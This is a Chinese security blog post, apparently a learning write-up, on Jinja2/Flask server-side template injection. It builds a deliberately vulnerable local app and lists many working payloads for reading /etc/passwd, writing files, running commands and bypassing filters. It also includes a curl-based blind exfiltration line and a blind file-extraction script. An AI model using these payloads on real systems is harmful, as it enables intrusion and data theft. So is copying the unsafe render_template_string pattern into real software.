
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>SSTI模板注入-Jinja2 | 离怀秋</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="前言又划水了一天，最后划累了学习了一会，写了这篇文章，又遇到的hexo遇见花括号解析错误的问题，一点点把文章断点才解决(hexo断点调试 SSTI介绍SSTI，服务端模板注入攻击，发生在MVA框架的view层中。 注入原因：  服务端接收了用户的输入，将未过滤的数据传给引擎解析，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题">
<meta property="og:type" content="article">
<meta property="og:title" content="SSTI模板注入-Jinja2">
<meta property="og:url" content="http://yoursite.com/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/index.html">
<meta property="og:site_name" content="离怀秋">
<meta property="og:description" content="前言又划水了一天，最后划累了学习了一会，写了这篇文章，又遇到的hexo遇见花括号解析错误的问题，一点点把文章断点才解决(hexo断点调试 SSTI介绍SSTI，服务端模板注入攻击，发生在MVA框架的view层中。 注入原因：  服务端接收了用户的输入，将未过滤的数据传给引擎解析，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题">
<meta property="og:image" content="https://s2.ax1x.com/2019/07/06/Z0NUje.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/07/06/Z0cb2d.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/07/06/Z0cc8J.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/07/06/Z0gmIU.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/07/06/Z0gBQA.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/07/07/ZB9Rtf.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/07/07/ZBZdhR.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/07/07/ZBcezj.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/07/07/ZBf9V1.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/07/07/ZBOhFg.png">
<meta property="article:published_time" content="2019-07-07T12:03:16.000Z">
<meta property="article:modified_time" content="2019-07-07T12:11:08.000Z">
<meta property="article:author" content="离怀秋">
<meta property="article:tag" content="Web安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.ax1x.com/2019/07/06/Z0NUje.png">
  
    <link rel="alternative" href="/atom.xml" title="离怀秋" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
<link rel="stylesheet" href="/css/style.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 4.2.1"></head>
<body>
<div id="container">
  <div id="wrap">
    <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">离怀秋</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">心未死 战未败</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
          <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="Search">
          <input type="submit" value="" class="search-form-submit">
          <input name=tn type=hidden value="bds">
          <input name=cl type=hidden value="3">
          <input name=ct type=hidden value="2097152">
          <input type="hidden" name="si" value="yoursite.com">
        </form>
      </div>
    </div>
  </div>
</header>
    <div class="outer">
      <section id="main"><article id="post-SSTI模板注入-Jinja2" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/" class="article-date">
  <time datetime="2019-07-07T12:03:16.000Z" itemprop="datePublished">2019-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      SSTI模板注入-Jinja2
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>又划水了一天，最后划累了学习了一会，写了这篇文章，又遇到的<code>hexo</code>遇见花括号解析错误的问题，一点点把文章断点才解决(<code>hexo</code>断点调试</p>
<h3 id="SSTI介绍"><a href="#SSTI介绍" class="headerlink" title="SSTI介绍"></a><code>SSTI</code>介绍</h3><p><code>SSTI</code>，服务端模板注入攻击，发生在<code>MVA</code>框架的<code>view</code>层中。</p>
<p>注入原因：</p>
<blockquote>
<p>服务端接收了用户的输入，将未过滤的数据传给引擎解析，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题</p>
</blockquote>
<p>测试<code>SSTI</code>的流程方式如下图：</p>
<p><img src="https://s2.ax1x.com/2019/07/06/Z0NUje.png" alt="Z0NUje.png"></p>
<h4 id="SSTI-for-Flask"><a href="#SSTI-for-Flask" class="headerlink" title="SSTI for Flask"></a><strong>SSTI for Flask</strong></h4><p><code>Flask</code>的模板引擎为<code>Jinja2</code>,而主要出现问题的函数为<code>render_template_string()</code>，并没有渲染模板文件，直接把字符串渲染到了<code>html</code>,如果不经过过滤则很容易造成恶意代码注入问题。</p>
<h3 id="实战过程"><a href="#实战过程" class="headerlink" title="实战过程"></a>实战过程</h3><h4 id="代码搭建"><a href="#代码搭建" class="headerlink" title="代码搭建"></a>代码搭建</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">	name = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">	template = <span class="string">'&lt;h1&gt;hello &#123;&#125;!&lt;h1&gt;'</span>.format(name)</span><br><span class="line">	<span class="keyword">return</span> render_template_string(template)</span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure>

<h4 id="注入检测"><a href="#注入检测" class="headerlink" title="注入检测"></a>注入检测</h4><p><img src="https://s2.ax1x.com/2019/07/06/Z0cb2d.png" alt="Z0cb2d.png"></p>
<p>通过<code>payload:1+1</code>的返回为<code>2</code>可以得知存在注入。</p>
<h4 id="导出config变量和session"><a href="#导出config变量和session" class="headerlink" title="导出config变量和session"></a>导出config变量和session</h4><p><img src="https://s2.ax1x.com/2019/07/06/Z0cc8J.png" alt="Z0cc8J.png"></p>
<p>可以通过<code>config</code>和<code>session</code>进行导出</p>
<h4 id="读-写文件"><a href="#读-写文件" class="headerlink" title="读/写文件"></a>读/写文件</h4><h5 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h5><p>通过<code>payload</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'file'</span>](<span class="string">'/etc/passwd'</span>).read()</span><br></pre></td></tr></table></figure>

<p>以上两种<code>payload</code>都可以进行文件读取</p>
<p><img src="https://s2.ax1x.com/2019/07/06/Z0gmIU.png" alt="Z0gmIU.png"></p>
<h5 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h5><p>同样也是两种<code>payload</code>，这里只列举一种了（其实可以通过<code>Fuzz</code>获得多种</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/evilconfig.cfg'</span>, <span class="string">'w'</span>).write(<span class="string">'test'</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/07/06/Z0gBQA.png" alt="Z0gBQA.png"></p>
<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].os.system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment">#也是载入__builtins__</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line"><span class="comment"># 重新载入__builtins__：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">"os"</span>).system(<span class="string">"ls"</span>)</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">60</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">29</span>].__call__(eval,<span class="string">'os.system("ls"))</span></span><br></pre></td></tr></table></figure>

<p><strong>python3的命令执行</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].eval(<span class="string">"__import__('os').popen('id').read()"</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'filename'</span>, <span class="string">'r'</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">-4</span>].__init__.__globals__[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">93</span>].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].system(<span class="string">"ls"</span>)</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">104</span>].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].system(<span class="string">"ls"</span>)</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

<p>既然可以命令执行，同样可以反弹<code>shell</code>，可以通过<code>bash</code>进行反弹<code>shell</code></p>
<h4 id="通过自定义模块执行命令"><a href="#通过自定义模块执行命令" class="headerlink" title="通过自定义模块执行命令"></a>通过自定义模块执行命令</h4><p>通过<code>SSTI</code>将以下内容写入<code>/tmp/test</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/test'</span>, <span class="string">'w'</span>).write(<span class="string">'from os import system\nCMD = system'</span>) &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123; <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/test'</span>, <span class="string">'w'</span>).write(<span class="string">'from subprocess import check_output\nRUNCMD=check_output'</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>利用<code>config.from_pyfile</code>对<code>/tmp/test</code>进行编译执行文件中的内容</p>
<p><img src="https://s2.ax1x.com/2019/07/07/ZB9Rtf.png" alt="ZB9Rtf.png"></p>
<p>可以通过<code>config</code>中的变量进行命令执行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config[<span class="string">'RUNCMD'</span>](<span class="string">'/usr/bin/id'</span>,shell=<span class="literal">True</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="绕过命令执行过滤"><a href="#绕过命令执行过滤" class="headerlink" title="绕过命令执行过滤"></a>绕过命令执行过滤</h3><h4 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号[]"></a>过滤中括号[]</h4><p>可以用<code>getitem</code>和<code>pop</code>进行绕过过滤</p>
<h5 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">'/etc/passwd'</span>).read()</span><br></pre></td></tr></table></figure>

<h5 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.__globals__.linecache.os.popen(<span class="string">'ls'</span>).read()</span><br></pre></td></tr></table></figure>

<h4 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h4><h5 id="chr函数绕过过滤"><a href="#chr函数绕过过滤" class="headerlink" title="chr函数绕过过滤"></a><strong>chr函数绕过过滤</strong></h5><p>获取<code>chr</code>函数，后面直接将文件名字<code>chr</code>出来.<code>payload</code>如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">40</span>)(chr(<span class="number">47</span>)%<span class="number">2</span>bchr(<span class="number">101</span>)%<span class="number">2</span>bchr(<span class="number">116</span>)%<span class="number">2</span>bchr(<span class="number">99</span>)%<span class="number">2</span>bchr(<span class="number">47</span>)%<span class="number">2</span>bchr(<span class="number">112</span>)%<span class="number">2</span>bchr(<span class="number">97</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)%<span class="number">2</span>bchr(<span class="number">119</span>)%<span class="number">2</span>bchr(<span class="number">100</span>)).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="借助request对象"><a href="#借助request对象" class="headerlink" title="借助request对象"></a><strong>借助request对象</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">40</span>)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd</span><br></pre></td></tr></table></figure>

<h5 id="过滤引号下的命令执行"><a href="#过滤引号下的命令执行" class="headerlink" title="过滤引号下的命令执行"></a><strong>过滤引号下的命令执行</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(chr(<span class="number">105</span>)%<span class="number">2</span>bchr(<span class="number">100</span>)).read() &#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd=id</span><br></pre></td></tr></table></figure>

<h4 id="过滤双下划线"><a href="#过滤双下划线" class="headerlink" title="过滤双下划线"></a>过滤双下划线</h4><p>同样利用<code>request</code>或者<code>__getattr__</code>进行绕过</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure>

<h5 id="命令执行-2"><a href="#命令执行-2" class="headerlink" title="命令执行"></a>命令执行</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ''[request.args.class][request.args.mro][2][request.args.subclasses]()[59][request.args.init][request.args.globals]['linecache'].os.popen('whoami').read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__&amp;init=__init__&amp;globals=__globals_</span><br></pre></td></tr></table></figure>

<h4 id="过滤双括号"><a href="#过滤双括号" class="headerlink" title="过滤双括号"></a>过滤双括号</h4><h5 id="利用如下标记，进行盲命令执行"><a href="#利用如下标记，进行盲命令执行" class="headerlink" title="利用如下标记，进行盲命令执行"></a>利用如下标记，进行盲命令执行</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">'curl http://127.0.0.1:7999/?i=`whoami`'</span>).read()==<span class="string">'p'</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/07/07/ZBZdhR.png" alt="ZBZdhR.png"></p>
<h5 id="盲注文件"><a href="#盲注文件" class="headerlink" title="盲注文件"></a>盲注文件</h5><p>利用<code>payload</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/lihuaiqiu'</span>).read()[<span class="number">0</span>:<span class="number">1</span>]==<span class="string">'f'</span> %&#125;~ok~&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<p>进行盲注，这里原作者<code>p0</code>的博客中只有<code>post脚本</code>，按照<code>sql</code>盲注的思路我自己也写了一个<code>GET</code>的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://127.0.0.1:5000?name="</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        payload=<span class="string">"&#123;% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/lihuaiqiu').read()["</span>+str(i)+<span class="string">":"</span>+str(i+<span class="number">1</span>)+<span class="string">"]=='"</span>+chr(j)+<span class="string">"' %&#125;~ok~&#123;% endif %&#125;"</span></span><br><span class="line">        true_url=url+payload</span><br><span class="line">        r=requests.get(true_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ok'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=chr(j)</span><br><span class="line">            <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="https://s2.ax1x.com/2019/07/07/ZBcezj.png" alt="ZBcezj.png"></p>
<h3 id="最后关于python沙箱逃逸以及Jinja2的一些思考"><a href="#最后关于python沙箱逃逸以及Jinja2的一些思考" class="headerlink" title="最后关于python沙箱逃逸以及Jinja2的一些思考"></a>最后关于python沙箱逃逸以及Jinja2的一些思考</h3><p>其实<code>SSTI</code>或者说<code>Python</code>沙箱逃逸，最重要的的几点还是找<code>object</code>，获取<code>subclasses</code>，然后对<code>subclasses</code>，进行<code>fuzz</code>，例如找到<code>linecache,catch_warnings</code>这种可以进行危险操作的东西，例如如下脚本的<code>fuzz</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  |% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %|</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls").read()'</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  |% endif %|</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;    //这里面的两个竖杠其实也是花括号，这里我是为了避免hexo解析错误的问题</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/07/07/ZBf9V1.png" alt="ZBf9V1.png"></p>
<p>逻辑就是在<code>subclasses</code>的子类中找到危险子类，可以通过寻找<code>catch_warnings</code>,因为在这个特殊的类中是有<code>__builtins__</code>这种危险属性的。第二个要说明的点是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__base__.__subclasses__()</span><br><span class="line"><span class="comment"># 返回子类的列表 [,,,...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#从中随便选一个类,查看它的__init__</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">30</span>].__init__</span><br><span class="line">&lt;slot wrapper <span class="string">'__init__'</span> of <span class="string">'object'</span> objects&gt;</span><br><span class="line"><span class="comment"># wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#再换几个子类，很快就能找到一个重载过__init__的类，比如</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">5</span>].__init__</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">5</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>]</span><br><span class="line"><span class="comment">#然后用eval执行命令即可</span></span><br></pre></td></tr></table></figure>

<p>之前看不是很懂，现在明白了。第三个点是在看一篇博文中发现的问题–<strong>Python的一切皆对象思想</strong></p>
<p><code>Python</code>一切皆对象，对于获取<code>object</code>类，传统的获取方式是<code>().__class__.__base__.subclasses__</code>，但是看到一篇博客后，一些沙雕的局限思维被打开了，这个过滤的部分如下</p>
<ul>
<li>config</li>
<li>class</li>
<li>mro</li>
<li>args</li>
<li>request</li>
<li>open</li>
<li>eval</li>
<li>builtins</li>
<li>import</li>
</ul>
<p>过滤掉了<code>class和request</code>有点致命,也就是说我们无法通过<code>[].__class__.__base__.__subclasses__()</code>这种操作获取基类，也无法通过<code>[][request.args.class]&amp;class=__class__</code>获取<code>object</code>,但是因为python的一切皆是对象思想,这里的<code>session</code>关键字并没有被过滤，其实<code>session</code>和<code>config</code>也是对象,我们可以通过<code>session</code>构造出<code>object</code>，payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session[&#39;__cla&#39;+&#39;ss__&#39;].__bases__[0].__bases__[0].__bases__[0].__bases__[0]</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/07/07/ZBOhFg.png" alt="ZBOhFg.png"></p>
<p>接着可以通过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;session[<span class="string">'__cla'</span>+<span class="string">'ss__'</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__subclasses__ &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>遍历出所有子类，但是这里class被过滤了，所以只能通过<code>__bases__[0][&#39;__subcl&#39;+&#39;asses__&#39;]</code>进行获取子类，再接着在里面找我们要找的危险类，这位师傅找的是<code>os._wrap_close</code>,不过我并没有在自己的<code>python2.7</code>本地环境找到这个<code>class</code>，最终payload为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; session[<span class="string">'__cla'</span>+<span class="string">'ss__'</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>][<span class="string">'__subcla'</span>+<span class="string">'sses__'</span>]()[<span class="number">312</span>].__init__.__globals__[<span class="string">'po'</span>+<span class="string">'pen'</span>](<span class="string">'ls /'</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>我本地模拟构造的为</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/?name=&#123;&#123;session[%27__cla%27+%27ss__%27].__bases__[0].__bases__[0].__bases__[0].__bases__[0][%27__subc%27+%27lasses__%27]()[40](%27/etc/passwd%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>成功读取了<code>/etc/passwd</code></p>
<p>第二点学到是<code>__enter__与__init__</code>的相似性</p>
<blockquote>
<p><code>object.__enter__</code>(<em>self</em>)</p>
<p>Enter the runtime context related to this object. The <a href="https://docs.python.org/zh-cn/2.7/reference/compound_stmts.html#with" target="_blank" rel="noopener"><code>with</code></a> statement will bind this method’s return value to the target(s) specified in the <a href="https://docs.python.org/zh-cn/2.7/reference/compound_stmts.html#as" target="_blank" rel="noopener"><code>as</code></a> clause of the statement, if any.</p>
</blockquote>
<p>上文为官方文档的描述，也就是我们同样可以通过<code>___enter__</code>来进入我们的对象取代<code>__init__</code>的过滤。</p>
